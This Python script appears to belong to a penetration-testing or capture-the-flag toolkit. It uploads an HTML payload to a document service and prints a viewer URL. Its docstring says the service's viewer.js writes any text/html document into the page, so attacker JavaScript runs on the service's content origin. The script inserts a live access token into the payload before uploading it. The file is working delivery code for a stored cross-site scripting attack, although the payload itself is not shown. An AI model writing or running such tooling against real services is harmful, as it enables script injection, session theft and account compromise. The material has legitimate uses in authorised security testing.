#!/usr/bin/env python3
"""
Upload payload.html as a text/html document and print its viewer URL.

Usage: mkpayload.py [tag] [file]
The viewer URL renders our JS on https://content.ariadnetab.xyz because
viewer.js document.write()s any text/html document. The cap lasts 60 minutes.
"""

import os
import sys
import time

import ari
import docs

HERE = os.path.dirname(os.path.abspath(__file__))


def refresh_token(state):
    tok = ari.get_token(state["email"], state["password"])
    state["access_token"] = tok["access_token"]
    ari.save_state(state)
    return state


def main():
    tag = sys.argv[1] if len(sys.argv) > 1 else "r%d" % (int(time.time()) % 10000)
    src = sys.argv[2] if len(sys.argv) > 2 else os.path.join(HERE, "payload.html")

    state = ari.load_state()
    state = refresh_token(state)

    with open(src) as handle:
        html = handle.read()
    html = html.replace("@@TOKEN@@", state["access_token"]).replace("@@TAG@@", tag)

    summary, _ = docs.upload(state, "payload-%s.html" % tag, "text/html", html.encode())
    url = docs.viewer_url(state, summary["id"])
    state["payload_id"] = summary["id"]
    state["payload_url"] = url
    state["tag"] = tag
    ari.save_state(state)
    print(url)


if __name__ == "__main__":
    main()
